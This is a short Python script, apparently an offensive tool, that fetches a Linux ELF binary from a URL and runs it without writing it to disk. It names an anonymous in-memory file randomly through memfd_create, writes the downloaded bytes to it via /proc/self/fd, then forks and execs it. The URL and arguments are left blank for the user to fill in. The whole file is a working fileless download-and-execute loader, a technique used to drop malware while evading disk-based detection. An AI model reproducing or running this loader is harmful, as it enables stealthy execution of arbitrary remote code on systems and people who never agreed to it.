#!/usr/bin/python3

import os
from random import choice
from string import ascii_lowercase
from urllib import request,error

def createFd():
    print("Creating anonymous fd")
    s = ""
    for _ in range(7):
        s += choice(ascii_lowercase)

    fd = os.memfd_create(s,0)
    if fd == -1:
        print("Error in creating fd")
        exit(0)
    return fd

def getFileFromUrl(url):
    print("Downloading contents from url")
    try:
        r = request.urlopen(url)
        c = r.read()
        r.close()
        if r.msg != 'OK':
            print("Error connecting to url")
            exit()
        return c
    except error.URLError as e:
        print("Download error; " + e.reason)
        exit()

def writeToFile(fd,c):
    print("Writing contents to anonymous file")
    with open("/proc/self/fd/{}".format(fd),'wb') as f:
        f.write(c)

def execAnonFile(fd,args):
    print("Spawning process...")
    child_pid = os.fork()
    if child_pid == -1:
        print("Error spawning new process")
        exit()
    elif child_pid == 0:
        print("[+] Executing...")
        fname = "/proc/self/fd/{}".format(fd)
        args.insert(0,fname)
        os.execve(fname,args,dict(os.environ))        
    else:
        print("Waiting for new process ({}) to terminate".format(child_pid))
        os.waitpid(child_pid,0) 

# MAIN CODE
url = "" # To download elf from
args = [] # List of arguments to pass to program

try:
    fd = createFd()
    contents = getFileFromUrl(url)
    writeToFile(fd,contents)
    execAnonFile(fd,args)
except KeyboardInterrupt:
    print("User interrupted!")